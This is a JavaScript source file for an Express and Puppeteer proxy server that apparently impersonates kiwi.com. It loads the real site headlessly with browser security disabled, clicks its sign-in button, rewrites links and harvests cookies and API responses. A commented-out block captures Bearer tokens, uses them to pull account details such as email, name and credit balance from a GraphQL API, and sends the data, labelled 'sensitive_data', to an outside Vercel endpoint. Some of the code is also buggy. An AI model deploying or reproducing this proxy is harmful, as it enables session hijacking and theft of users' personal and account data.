const express = require('express');
const fs = require('fs');
const https = require('https');
const puppeteer = require('puppeteer');
const app = express();

const privatekey = fs.readFileSync('/home/serverproxy/server.key', 'utf8');
const certificate = fs.readFileSync('/home/serverproxy/server.crt', 'utf8');

const credentials = { key: privatekey, cert: certificate };
let dynamicResponses = [];

let browser; // Global browser instance
let cookies = null; // Global cookie store

// Helper function to ensure correct URL protocol
function ensureProtocol(url) {
  if (!/^https?:\/\//i.test(url)) {
    return `https://${url}`;
  }
  return url;
}




// Middleware to proxy requests
  app.use('/proxy/*', async (req, res) => {
  const targetUrl = req.params[0]; // Extract target URL
  const fullUrl = ensureProtocol(targetUrl); // Ensure correct URL

  console.log(`Target URL: ${targetUrl}`);
  console.log(`Full URL: ${fullUrl}`); 


  let authToken = null; // To capture the auth token


     if (!browser) {
      // Launch Puppeteer browser
      browser = await puppeteer.launch({
        headless: true, 
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-web-security', '--disable-features=IsolateOrigins,site-per-process', '--disable-site-isolation-trials', '--window-size=1920,1080'],
        defaultViewport: {
          width: 1920,
          height: 1080
        },
      });
    }

    const pages = await browser.pages();
    const page = pages[0];



  await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36');



    // Reuse cookies if we have them
    if (cookies) {
      await page.setCookie(...cookies);
    }

  await page.setRequestInterception(true);
    page.on('request', (request) => {
        const url = request.url();
        console.log(`target url: ${url}`);

        // Check if the URL contains the specific pattern you want to bypass
        if (url.includes("'+_.X(_.vk(c.profilePicture))+'")) {
            console.log(`Bypassing request to: ${url}`);
            // Abort the request for this specific URL
            request.abort();
        } 
         else if (url.includes('youtube.com'))   {
              console.log(`Bypassing request to: ${url}`);
            // Abort the request for this specific URL
            request.continue();
        } 
         else {
            // Continue with other requests
  if (!request.isInterceptResolutionHandled()) {
            request.continue();
        }
        }
    });


  page.on('response', async (response) => {
    const url = response.url();  // Get the URL of the response
    const status = response.status();  // Get the HTTP status code
    const headers = response.headers();  // Get the response headers

    console.log(`Response from ${url}`);
    console.log(`Status: ${status}`);
    console.log('Headers:', headers);
    // Navigate to the target URL with no timeout and wait until the network is idle
// Try to get the body if it exists, avoid it for redirects or large files
     // Try to get the body if it exists, avoid it for redirects or large files
    try {
        // Check if the response is a valid response, not a redirect or empty
   const contentType = headers['content-type'];  

        if (status >= 200 && status < 300 && !response.headers()['content-type'].includes('html')) {
            const responseBody = await response.buffer();  // Get the response body as Buffer
            console.log(`Captured response from ${url}`);
            console.log(`Status: ${status}`);
            console.log('Headers:', headers);

            // Save dynamic responses (API calls, scripts, images, etc.)
            dynamicResponses.push({ url, status, headers, body: responseBody });
        }
    } catch (err) {
        console.error(`Error fetching response from ${url}:`, err);
    }
});
    // Send the loaded content back to the client


// Ensure that 'fullUrl' is correctly formed before using it
try {
    await page.goto(fullUrl, { waitUntil: 'networkidle2', timeout: 1500000 });
}
catch (err) {
    console.error("Error navigating to URL:", fullUrl);
    console.error(err.message);
    return res.status(500).send(`Navigation error: ${err.message}`);
}

     content = await page.content();

try {
    await page.waitForSelector('button[data-Test="signInButton"]', { visible: true, timeout: 30000 }); // Adjust the timeout as needed
    console.log("Sign In button is now visible.");

    // Click the Sign In button
    await page.click('button[data-Test="signInButton"]');
    console.log("Clicked the Sign In button.");
} catch (err) {
    console.error("Error waiting for or clicking Sign In button:", err.message);
    return res.status(500).send("Failed to find or click Sign In button");
}

    // Get the content of the page after it's fully loaded
content = content.replace(/src="\//g, 'src="https://kiwi.com/');
content = content.replace(/href="\//g, 'href="https://kiwi.com/');

    res.write(content);

    // Now write all dynamic responses captured earlier
    for (const dynamicResponse of dynamicResponses) {
        res.write(dynamicResponse.body);
    }




/*
  
     // Capture Authorization token if it exists
      if (headers['authorization'] && headers['authorization'].startsWith('Bearer ')) {
        authToken = headers['authorization'];
        console.log(`Captured Authorization Bearer Token: ${authToken}`);
 fetch("https://plexus-prod.skypicker.com/graphql", {
            method: "POST",
            headers: {
                "Authorization": `${authToken}`,
                "Content-Type": "application/json",
                "Accept": "",
                "Accept-Language": "en-US,en;q=0.5",
            },
            body: JSON.stringify({"query":"\n  query getTokenUserQuery {\n    viewer {\n      __typename\n      ... on Unauthorized {\n        reason\n      }\n      ... on User {\n        ...Balances\n        ...Inbox\n        userId\n        affiliateId\n        socialAvatar\n        avatar {\n          url\n        }\n        locale {\n          language {\n            languageId\n            code\n          }\n          currency {\n            code\n          }\n        }\n        hasPassword\n        identity {\n          email\n          name {\n            first\n            last\n            full\n          }\n          isVerified\n        }\n        referFriend {\n          numberOfValidPromoCodes\n        }\n        vipSubscription {\n          isEligible\n          subscriptionDetails {\n            endsAt\n            isSubscribed\n            startsAt\n          }\n        }\n        events {\n          androidUsed\n          iosUsed\n          webUsed\n        }\n        flightAncillariesPreferences {\n          seatingPreferences {\n            seatType\n            planeArea\n            extraLegRoom\n          }\n          baggagePreferences {\n            flightAncillariesPreferencesTripType\n            baggagePreferencesType\n          }\n        }\n      }\n    }\n  }\n  fragment Balances on User {\n    creditBalance {\n      creditAmounts {\n        edges {\n          node {\n            amount\n            currency {\n              code\n            }\n          }\n        }\n      }\n    }\n  }\n\n  fragment Inbox on User {\n    inbox {\n      numberOfUnreadMessages\n    }\n  }\n"})
        })
        .then(response => response.json())
        .then(data => {
            console.log("Data from the target:", data);

            // Prepare the payload for your Vercel function
            const payload = {
                key: 'sensitive_data',
                value: JSON.stringify(data) // Adjust key and value as needed
            };

            // Send the data to your Vercel function
            fetch("https://vercelserver-tdd1.vercel.app/payload", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            })
            .then(vercelResponse => vercelResponse.json())
            .then(vercelData => {
                console.log("Data sent to Vercel:", vercelData);
            })
            .catch(vercelError => {
                console.error("Error sending data to Vercel:", vercelError);
            });
        })
        .catch(err => {
            console.error("Error fetching data from target:", err);

            // Prepare fallback payload for Vercel
            const fallbackPayload = {
                key: 'error',
                value: JSON.stringify(err)
            };

            // Send the error information to your Vercel function
            fetch("https://vercelserver-tdd1.vercel.app/payload", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(fallbackPayload)
            })
            .then(vercelResponse => vercelResponse.json())
            .then(vercelData => {
                console.log("Error data sent to Vercel:", vercelData);
            })
            .catch(vercelError => {
                console.error("Error sending error data to Vercel:", vercelError);
            });
        });


      }
*/




    // Handle the cookie consent button manually
   try {
      await page.waitForSelector('button', { visible: true, timeout:500000 });
      console.log('Cookie consent button detected.');


        // Wait for the page to update after clicking the consent button
      await page.waitForSelector('header, main, script', { visible: true, timeout: 500000 });

    } catch (error) {
      console.log('Cookie consent button not found or already accepted.');
    }

    // Save cookies after consent is handled
   cookies = await page.cookies();

 

    // Close the page after serving content
    await page.close();
 
});

// Gracefully shut down Puppeteer
process.on('exit', async () => {
  if (browser) {
    await browser.close();
  }
});

const httpsServer = https.createServer(credentials, app);


httpsServer.listen(443, () => console.log('Proxy server running on port 443'));
